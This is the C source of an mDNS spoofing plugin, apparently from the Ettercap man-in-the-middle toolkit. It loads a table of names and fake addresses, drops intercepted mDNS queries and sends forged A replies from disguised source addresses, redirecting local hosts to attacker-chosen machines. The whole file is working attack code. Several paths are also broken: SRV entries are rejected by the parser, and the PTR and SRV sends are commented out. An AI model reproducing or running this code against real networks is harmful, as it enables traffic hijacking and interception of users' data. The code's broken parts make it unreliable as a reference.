/*
    mdns_spoof -- ettercap plugin -- spoofs mdns replies

    Copyright (C) Ettercap Development Team
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_file.h>
#include <ec_hook.h>
#include <ec_resolv.h>
#include <ec_send.h>

#include <stdlib.h>
#include <string.h>

#ifndef ns_t_wins
#define ns_t_wins 0xFF01      /* WINS name lookup */
#endif

#define MDNS_QU_FLAG 0x8000

struct mdns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t questions;
    uint16_t answer_rrs;
    uint16_t auth_rrs;
    uint16_t additional_rrs;
};

struct mdns_spoof_entry {
   int   type;   /* ns_t_a, ns_t_ptr, ns_t_srv */
   char *name;
   struct ip_addr ip;
   char *target; /* for SRV records */
   SLIST_ENTRY(mdns_spoof_entry) next;
};

static SLIST_HEAD(, mdns_spoof_entry) mdns_spoof_head;

/* protos */

int plugin_load(void *);
static int mdns_spoof_init(void *);
static int mdns_spoof_fini(void *);
static int load_db(void);
static void mdns_spoof(struct packet_object *po);
static int parse_line(const char *str, int line, int *type_p, char **ip_p, char **name_p);
static int get_spoofed_a(const char *a, struct ip_addr **ip);
static int get_spoofed_ptr(const char *arpa, char **a);
static int get_spoofed_srv(const char *name, char **target);
static int get_spoofed_mx(const char *a, struct ip_addr **ip);
static int get_spoofed_wins(const char *a, struct ip_addr **ip);
static int prep_mdns_reply(struct packet_object *po, u_int16 class, struct ip_addr **sender, struct ip_addr **target, u_int8 **tmac , struct ip_addr *reply);
char *type_str(int type);
static void mdns_spoof_dump(void);

/* plugin operations */

struct plugin_ops mdns_spoof_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "mdns_spoof",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Sends spoofed mDNS replies",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &mdns_spoof_init,
   /* deactivation function */                     
   .fini =              &mdns_spoof_fini,
};

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   /* load the database of spoofed replies (etter.dns) 
    * return an error if we could not open the file
    */
   if (load_db() != ESUCCESS)
      return -EINVALID;
   
   mdns_spoof_dump();
   return plugin_register(handle, &mdns_spoof_ops);
}

static int mdns_spoof_init(void *dummy) 
{
   /* 
    * add the hook in the dissector.
    * this will pass only valid dns packets
    */
   hook_add(HOOK_PROTO_MDNS, &mdns_spoof);
   
   return PLUGIN_RUNNING;
}


static int mdns_spoof_fini(void *dummy) 
{
   /* remove the hook */
   hook_del(HOOK_PROTO_MDNS, &mdns_spoof);

   return PLUGIN_FINISHED;
}

/*
 * load the database in the list 
 */
static int load_db(void)
{
   struct mdns_spoof_entry *d;
   struct in_addr ipaddr;
   FILE *f;
   char line[128];
   char *ptr, *ip, *name;
   int lines = 0, type;
   
   /* open the file */
   f = open_data("etc", ETTER_MDNS, FOPEN_READ_TEXT);
   if (f == NULL) {
      USER_MSG("mdns_spoof: Cannot open %s ", ETTER_MDNS);
      return -EINVALID;
   }
         
   /* load it in the list */
   while (fgets(line, 128, f)) {
      /* count the lines */
      lines++;

      /* trim comments */
      if ( (ptr = strchr(line, '#')) )
         *ptr = '\0';

      /* skip empty lines */
      if (!*line || *line == '\r' || *line == '\n')
         continue;
      
      /* strip apart the line */
      if (!parse_line(line, lines, &type, &ip, &name))
         continue;
        
      /* convert the ip address */
      if (inet_aton(ip, &ipaddr) == 0) {
         if (type != ns_t_srv) {
             USER_MSG("mdns_spoof: %s:%d Invalid ip address\n", ETTER_MDNS, lines);
             continue;
         }
      }
        
      /* create the entry */
      SAFE_CALLOC(d, 1, sizeof(struct mdns_spoof_entry));
      d->name = strdup(name);
      d->type = type;

      if (type != ns_t_srv) {
          /* fill the struct */
          ip_addr_init(&d->ip, AF_INET, (u_char *)&ipaddr);
      } else {
        d->target = ip;
      }


      /* insert in the list */
      SLIST_INSERT_HEAD(&mdns_spoof_head, d, next);
   }

      fclose(f);

   return ESUCCESS;
}

/*
 * Parse line on format "<name> <type> <IP-addr>".
 */
static int parse_line (const char *str, int line, int *type_p, char **ip_p, char **name_p)
{
   static char name[100+1];
   static char ip[20+1];
   char type[10+1];

 DEBUG_MSG("mdns_spoof: %s:%d str '%s'", ETTER_MDNS, line, str); 

   if (sscanf(str,"%100s %10s %20[^\r\n# ]", name, type, ip) != 3) {
      USER_MSG("mdns_spoof: %s:%d Invalid entry %s\n", ETTER_MDNS, line, str);
      return (0);
   }

   if (!strcasecmp(type,"PTR")) {
      if (strpbrk(name,"*?[]")) {
         USER_MSG("mdns_spoof: %s:%d Wildcards in PTR records are not allowed; %s\n",
                  ETTER_MDNS, line, str);
         return (0);
      }
      *type_p = ns_t_ptr;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"A")) {
      *type_p = ns_t_a;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type, "SRV")) {
    *type_p = ns_t_srv;
    *name_p = name;
    *ip_p = ip;
   }

   USER_MSG("mdns_spoof: %s:%d Unknown record type %s\n", ETTER_MDNS, line, type);
   return (0);
}

/*
 * parse the request and return a spoofed response
 */
 static void mdns_spoof(struct packet_object *po)
 {
    po->flags |= PO_DROPPED; /* Do not forward query */

    struct mdns_header *mdns;
    char name[NS_MAXDNAME];
    int name_len;
    u_char *q, *data, *end;;
    u_int16 class;
    u_int16 type;
    int x;

    mdns = (struct mdns_header *)po->DATA.data;
    data = (u_char *)(mdns+1);
    end = (u_char *)mdns + po->DATA.len;

    q = data;

    if (mdns->flags == 0x8400 || mdns->answer_rrs > 0)
    {
        //We only want queries.
        return;
    }

    /* process all the questions */
    for (x = 0; x < mdns->questions; x++) {

      name_len = dn_expand((u_char*)mdns, end, q, name, sizeof(name));

      q = data + name_len;

      if (q >= end || name_len == 0)
        return;

      NS_GET16(type, q);
      NS_GET16(class, q);

      /* handle only internet class - unmask the QU flag */
      if ((class & ~MDNS_QU_FLAG) != ns_c_in)
         return;

      if(type == ns_t_a) {
         struct ip_addr *reply;
         struct ip_addr *sender;
         struct ip_addr *target;
         u_int8 *tmac;
         u_int8 answer[name_len + 10 + 4];
         u_char *p = answer + name_len;
         char tmp[MAX_ASCII_ADDR_LEN];
         
         /* found the reply in the list */
         if (get_spoofed_a(name, &reply) != ESUCCESS)
            return;

        /* 
         * in MDNS the original question is not included 
         * into the reply packet as with pure DNS - 
         * fill the buffer with the questioned name of the request
         * we will append the answer just after the quoted name 
         */
         memcpy(answer, data, name_len);                  /* name */
         memcpy(p    , "\x00\x01", 2);                    /* type A */
         memcpy(p + 2, "\x00\x01", 2);                    /* class */
         memcpy(p + 4, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         memcpy(p + 8, "\x00\x04", 2);                    /* datalen */
         ip_addr_cpy(p + 10, reply);                      /* data */

         /*
          * depending on the MDNS question, the target address hast to be redefined;
          * we also can not use the multicast address as the source but also;
          * don't want to reveal our own IP, so the sender needs also be redefined;
          * hence the variables for the transport of the reply need to be prepared.
          */
         prep_mdns_reply(po, class, &sender, &target, &tmac, reply);

         /* send the reply back to the multicast or unicast address 
          * and set the faked address as the source address for the transport
          */
         send_mdns_reply(po->L4.src, sender, target, tmac, 
                         ntohs(mdns->id), answer, sizeof(answer), 1, 0, 0);
         
         USER_MSG("mdns_spoof: [%s %s] spoofed to [%s]\n", name, type_str(type), ip_addr_ntoa(reply, tmp));
       }
       else if (type == ns_t_ptr) {
         u_int8 answer[(q - data) + 256];
         char *a, *p = (char*)answer + (q - data);
         int rlen;
         
         /* found the reply in the list */
         if (get_spoofed_ptr(name, &a) != ESUCCESS)
            return;

         /* 
          * fill the buffer with the content of the request
          * we will append the answer just after the request 
          */
         memcpy(answer, data, q - data);
         
         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\x00\x0c", 2);                    /* type PTR */
         memcpy(p + 4, "\x00\x01", 2);                    /* class */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         /* compress the string into the buffer */
         rlen = dn_comp(a, (u_char*)p + 12, 256, NULL, NULL);
         /* put the length before the dn_comp'd string */
         p += 10;
         NS_PUT16(rlen, p);

         /* send the fake reply */
        // send_mdns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(mdns->id), answer, (q - data) + 12 + rlen, 0);
         
         USER_MSG("mdns_spoof: [%s %s] spoofed to [%s]\n", name, type_str(type), a);
      }
      else if (type == ns_t_srv) {
          u_int8 answer[(q - data) + 256];
          char *a, *p = (char *)answer + (q - data);
          int rlen;
	  char *tok;

          char *target;
          char *port_ptr;
          int port;


          if (get_spoofed_srv(name, &a) != ESUCCESS) 
              return;

          /*
           * Extract port and target
           */
/*
          if (sscanf(a, "%20s:%d", target, &port) != 2) {
              return;
          }
*/

	  target = ec_strtok(a, ":", &tok);

	  if (target == NULL)
		return;

	  port_ptr = ec_strtok(NULL, ":", &tok);

	  if (port_ptr == NULL)
		return;

	  port = atoi(port_ptr);

          /* 
           * fill the buffer with the content of the request
           * answer will be appended after the request */
           memcpy(answer, data, q - data);

           /* prepare the answer */
           memcpy(p, "\xc0\x0c", 2);              /* compressed name offset */
           memcpy(p + 2, "\x00\x21", 2);          /* type SRV */
           memcpy(p + 4, "\x00\x01", 2);          /* class IN */
           memcpy(p + 6, "\x00\x00\x02\x10", 4); /* TTL (1 hour) */

           rlen = dn_comp(target, (u_char*)p+18, 256, NULL, NULL);

           p+=10;

           NS_PUT16(rlen, p);

           memcpy(p + 2, "\x00\x00", 2);         /* priority 0 */
           memcpy(p + 4, "\x00\x00", 2);         /* weight */

           p+=6;
           NS_PUT16(port, p);                  /* port */

           /* send fake reply */
           // send_mdns_reply(po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src, ntohs(mdns->id), answer, sizeof(answer), 0);

           USER_MSG("mdns_spoof: [%s %s] spoofed to [%s]\n", name, type_str(type), a);
      }
    }


 }

/*
 * return the ip address for the name
 */
static int get_spoofed_a(const char *a, struct ip_addr **ip)
{
   struct mdns_spoof_entry *d;

   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      if (d->type == ns_t_a && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/* 
 * return the name for the ip address 
 */
static int get_spoofed_ptr(const char *arpa, char **a)
{
   struct mdns_spoof_entry *d;
   struct ip_addr ptr;
   int a0, a1, a2, a3;
   u_char ip[4];

   /* parses the arpa format */
   if (sscanf(arpa, "%d.%d.%d.%d.in-addr.arpa", &a3, &a2, &a1, &a0) != 4)
      return -EINVALID;

   /* reverse the order */
   ip[0] = a0 & 0xff; 
   ip[1] = a1 & 0xff; 
   ip[2] = a2 & 0xff; 
   ip[3] = a3 & 0xff;

   /* init the ip_addr structure */
   ip_addr_init(&ptr, AF_INET, ip);

   /* search in the list */
   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      /* 
       * we cannot return whildcards in the reply, 
       * so skip the entry if the name contains a '*'
       */
      if (d->type == ns_t_ptr && !ip_addr_cmp(&ptr, &d->ip)) {

         /* return the pointer to the name */
         *a = d->name;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/*
 * return the ip address for the name (MX records)
 */
static int get_spoofed_mx(const char *a, struct ip_addr **ip)
{
   struct mdns_spoof_entry *d;

   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      if (d->type == ns_t_mx && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;
         
         return ESUCCESS;
      }
   }
   
   return -ENOTFOUND;
}

/*
 * return the ip address for the name (NetBIOS WINS records)
 */
static int get_spoofed_wins(const char *a, struct ip_addr **ip)
{
   struct mdns_spoof_entry *d;

   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      if (d->type == ns_t_wins && match_pattern(a, d->name)) {

         /* return the pointer to the struct */
         *ip = &d->ip;

         return ESUCCESS;
      }
   }

   return -ENOTFOUND;
}

static int get_spoofed_srv(const char *name, char **target) 
{
    struct mdns_spoof_entry *d;

    SLIST_FOREACH(d, &mdns_spoof_head, next) {
        if (d->type == ns_t_srv && match_pattern(name, d->name)) {
            *target = d->target;

            return ESUCCESS;
        }
    }

    return -ENOTFOUND;
}

/*
 * define sender address and target address 
 */
static int prep_mdns_reply(struct packet_object *po, u_int16 class, struct ip_addr **sender, 
                      struct ip_addr **target, u_int8 **tmac , struct ip_addr *reply)
{
   char tmp[MAX_ASCII_ADDR_LEN];

   if ((class & MDNS_QU_FLAG) == 0x8000 && ip_addr_is_multicast(&po->L3.dst)) { 
      /* received multicast but unicast response requested */
      if (reply->addr_type == po->L3.src.addr_type) {
         /* 
          * address family of spoofed address matches address family 
          * of the transport protocol - we use it as the sender
          */
         *sender = reply;
         *target = &po->L3.src;
         *tmac = po->L2.src;

         return ESUCCESS;

      } else {
         /*
          * we can not use the spoofed address as the sender 
          * a random link-local address need to be generated
          */
         if (ip_addr_random(&po->L3.dst, ntohs(po->L3.src.addr_type)) == ESUCCESS) {
            DEBUG_MSG("random IP generated: %s\n", ip_addr_ntoa(&po->L3.dst, tmp));

            *sender = &po->L3.dst;
            *target = &po->L3.src;
            *tmac = po->L2.src;

            return ESUCCESS;

         } else {
            DEBUG_MSG("Random sender IP generation failed\n");
            DEBUG_MSG("Unknown address family: %s \n", ip_addr_ntoa(&po->L3.src,tmp));
            
            return -ENOADDRESS;
         }
      }
   } else if (!ip_addr_is_multicast(&po->L3.dst)) {
      /* MDNS received via unicast - response via unicast */
      *sender = &po->L3.dst;
      *target = &po->L3.src;
      *tmac = po->L2.src;

      return ESUCCESS;

   } else { 
      /* normal multicast reply */
      if (reply->addr_type == po->L3.dst.addr_type) {
         /* 
          * send the reply back to the multicast address and set 
          * the spoofed address also as the source ip address
          */
         *sender = reply;
         *target = &po->L3.dst;
         *tmac = po->L2.dst;

         return ESUCCESS;

      } else {
         /*
          * we can not use the spoofed address as the sender 
          * a random link-local address need to be generated
          */
         if (ip_addr_random(&po->L3.src, ntohs(po->L3.src.addr_type)) == ESUCCESS) {
            DEBUG_MSG("random IP generated: %s\n", ip_addr_ntoa(&po->L3.src, tmp));

            /* 
             * send the reply back to the multicast address and set the
             * faked address as the source
             */
            *sender = &po->L3.src;
            *target = &po->L3.dst;
            *tmac = po->L2.dst;

            return ESUCCESS;

         } else {
            DEBUG_MSG("Random sender IP generation failed\n");
            DEBUG_MSG("Unknown address family: %s \n", ip_addr_ntoa(&po->L3.src,tmp));
            
            return -ENOADDRESS;
         }
      }
   }
}


char *type_str (int type)
{
   return (type == ns_t_a    ? "A" :
           type == ns_t_ptr  ? "PTR" :
           type == ns_t_srv   ? "SRV" : "?");
}

static void mdns_spoof_dump(void)
{
   struct mdns_spoof_entry *d;

   DEBUG_MSG("mdns_spoof entries:");
   SLIST_FOREACH(d, &mdns_spoof_head, next) {
      if (ntohs(d->ip.addr_type) == AF_INET)
         DEBUG_MSG("  %s -> [%s], type %s", d->name, int_ntoa(d->ip.addr),
                   type_str(d->type));
      else
      {
         DEBUG_MSG("  %s -> ??", d->name);   /* IPv6 possible? */
      }
   }
}


